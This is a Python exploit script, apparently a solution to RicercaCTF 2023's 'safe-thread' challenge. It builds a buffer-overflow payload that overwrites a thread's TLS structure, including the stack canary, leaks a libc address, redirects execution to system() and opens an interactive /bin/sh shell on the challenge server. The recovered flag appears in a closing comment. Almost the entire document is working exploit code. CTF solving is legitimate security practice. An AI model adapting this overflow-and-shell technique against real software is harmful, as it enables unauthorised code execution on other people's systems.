#!/usr/bin/env python3
from sc_expwn import *  # https://raw.githubusercontent.com/shift-crops/sc_expwn/master/sc_expwn.py

bin_file = './chall'
context(os = 'linux', arch = 'amd64')
# context.log_level = 'debug'

#==========

env = Environment('debug', 'local', 'remote')
env.set_item('mode',    debug = 'DEBUG', local = 'PROC', remote = 'SOCKET')
env.set_item('target',  debug   = {'argv':[bin_file], 'aslr':False, 'gdbscript':''}, \
                        local   = {'argv':[bin_file]}, \
                        remote  = {'host':'safe-thread.2023.ricercactf.com', 'port':9004})
env.set_item('libc',    debug   = None, \
                        local   = None, \
                        remote  = 'libc.so.6')
env.select()

#==========

binf = ELF(bin_file)
addr_data            = binf.sep_section['.data']

libc = ELF(env.libc) if env.libc else binf.libc
offset_libc_initial = 0x21af00 # libc.symbols['initial']

#==========

def attack(conn, **kwargs):
    rop = ROP(binf)

    fake_tls  = p64(0xdeadbeef)*2
    fake_tls += p64(addr_data + 0x100)
    fake_tls += p64(1)
    fake_tls += p64(0)
    fake_tls += p64(0x1122334455667700)
    fake_tls += p64(0x4012c3)

    exploit  = b'\x00'*0x7d8
    exploit += p64(addr_data + 5)
    exploit  = exploit.ljust(0x830, b'\x00')
    exploit += fake_tls
    exploit += exploit.ljust(0x900, b'\x00')

    conn.sendlineafter(b'size: ', str(len(exploit)).encode())
    conn.sendafter(b'data: ', exploit)

    addr_libc_initial = u64(conn.recv(8))
    libc.address = addr_libc_initial - offset_libc_initial
    info('addr_libc_base    = 0x{:08x}'.format(libc.address))
    addr_libc_system    = libc.sep_function['system']
    addr_libc_do_system    = addr_libc_system - 0x470

    fake_tls  = b'/bin/sh\x00'
    fake_tls += p64(0xdeadbeef)
    fake_tls += p64(addr_data + 0x100)
    fake_tls += p64(1)
    fake_tls += p64(0)
    fake_tls += p64(0x1122334455667700)
    fake_tls += p64(addr_libc_do_system+2)

    exploit  = b'\x00'*0x870
    exploit += p64(addr_data+0x10)
    exploit  = exploit.ljust(0x8c8, b'\x00')
    exploit += fake_tls

    conn.sendline(exploit)

#==========

def main():
    comn = Communicate(env.mode, **env.target)
    comn.connect()
    comn.run(attack)
    comn.interactive()
    # flag-b620074ecec0a4693a967174b8d8d4af.txt
    # RicSec{pthread_1s_w34k_t0_BOF_by_d3s1gn}

if __name__=='__main__':
    main()

#==========
